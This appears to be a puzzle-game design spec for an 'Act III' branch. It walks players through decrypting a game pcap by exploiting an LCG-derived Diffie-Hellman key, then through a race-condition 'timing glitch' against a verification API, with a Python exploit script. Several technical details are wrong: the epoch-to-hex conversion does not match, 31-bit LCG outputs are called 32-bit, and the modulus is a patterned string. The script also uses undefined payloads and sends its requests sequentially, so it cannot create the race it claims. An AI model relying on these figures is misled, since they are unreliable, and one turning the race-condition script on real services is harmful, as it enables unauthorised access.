# PCAP Cryptanalysis & Timing Glitch — Technical Specification
### Document ID: SPEC-ACT3-PCAPGLITCH
### Status: Release/Production-Ready
### Target Implementation: Act III Branching Path

This document details the decryption logic for `HYDRA_CAPTURE.pcapng` and the implementation constraints for the timing-glitch exploit on the Vercel API.

---

## 1. Network Capture Decryption Specification

The pcap contains encrypted TCP streams of a historical session. To extract the metadata, the participant must derive the AES-256 session key by exploiting a weakness in the client's Diffie-Hellman private exponent generation.

### 1.1 Diffie-Hellman Parameters
* **Modulus ($p$):** 512-bit prime:
  `0x9B15E3F0A1823B4E6C2D8A9F123C4B5A6E7D8F901BC2A3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4`
* **Generator ($g$):** `2`
* **Server Public Key ($A$):** Captured in packet offset `0x42` of TCP Stream 0.
* **Client Public Key ($B$):** Captured in packet offset `0x84` of TCP Stream 0.

### 1.2 Ephemeral Private Key Derivation
Instead of secure random selection, the client's private exponent $b$ is derived using a Linear Congruential Generator (LCG) seeded with parameters recovered in Act 0:
* **Inputs:**
  * NetBIOS ID: `REYES-LAPTOP`
  * Host Key: `STARK-FALLBACK-KEY-2026` (from Act 0 blueprint alignment)
  * build_epoch: `1781259200`
* **Derivation Math:**
  $$\text{Seed} = \text{CRC32}(\text{NetBIOS\_ID} + \text{Host\_Key}) \oplus \text{build\_epoch}$$
  * Concat string: `"REYES-LAPTOPSTARK-FALLBACK-KEY-2026"`
  * CRC32: `0xD8C2A1BF`
  * Seed: `0xD8C2A1BF` $\oplus$ `0x6A2C29C0` = `0xB2EE887F`
* **Private Key Generator:**
  Using the seed, the first two 32-bit outputs of the LCG ($X_1, X_2$) are concatenated to form the 64-bit private key $b$:
  $$X_{n+1} = (1103515245 \cdot X_n + 12345) \pmod{2^{31}}$$
  * $X_1 = \text{LCG}(Seed)$
  * $X_2 = \text{LCG}(X_1)$
  * $b = (X_1 \ll 32) \lor X_2$

### 1.3 Key Derivation & Stream Decryption
Once the player computes $b$, they derive the shared secret $K$:
$$K = A^b \pmod p$$
* **Symmetric Key:**
  $$\text{AES\_Key} = \text{SHA-256}(K.\text{to\_bytes}(64, \text{'big'}))$$
* **Cipher Mode:** AES-256-CBC with an initialization vector (IV) prepended to the ciphertext block (first 16 bytes of the TCP payload).

---

## 2. Timing-Glitch Attack Specification

The decrypted HTTP packets reveal that HYDRA exploited a race condition in the verification endpoint of the Vercel dashboard.

### 2.1 The Race Condition
The verifier endpoint uses a two-phase check:
1. Validates that the calibration coefficients are saved in the DB session state.
2. Triggers the ZKP module authorization check.
If a second request is received *exactly* as the first query finishes reading the lock status but before the lock is updated, the database state is overwritten, granting temporary authorization.

### 2.2 Latency Alignment Math
To execute this timing exploit successfully against the Vercel deployment, the client must trigger the second request with a precise delay matching the round-trip network latency:

$$\text{Glitch\_Delay} = \text{RTT}_{\text{measured}} \oplus \text{Shift\_Offset}$$

* **`RTT_measured`:** Calculated by the player's exploit script before launching the exploit using the average time of 5 HTTP requests to `/api/v1/auth/ping`.
* **`Shift_Offset`:** Recovered from the visual blueprint alignment in Act 0 (`42`).
* **Unit:** Milliseconds.
* **Tolerance:** The delay must hit a window of $\pm 2$ milliseconds on the server edge node.

### 2.3 Exploit Execution Block (Python)
```python
import time
import requests

def run_glitch_exploit(target_url, shift_offset):
    # Measure RTT
    rtts = []
    for _ in range(5):
        t0 = time.perf_counter()
        requests.get(f"{target_url}/api/v1/auth/ping")
        rtts.append((time.perf_counter() - t0) * 1000)
    
    avg_rtt = sum(rtts) / len(rtts)
    delay_ms = (int(avg_rtt) ^ shift_offset) / 1000.0
    
    print(f"Measured Avg RTT: {avg_rtt:.2f}ms. Calculated Delay: {delay_ms*1000:.2f}ms")
    
    # Request A
    requests.post(f"{target_url}/api/v1/auth/verify", json=payload_a)
    # Wait for the calculated race condition window
    time.sleep(delay_ms)
    # Request B (Exploit trigger)
    res = requests.post(f"{target_url}/api/v1/auth/verify", json=payload_b)
    print("Exploit response status:", res.status_code)
```
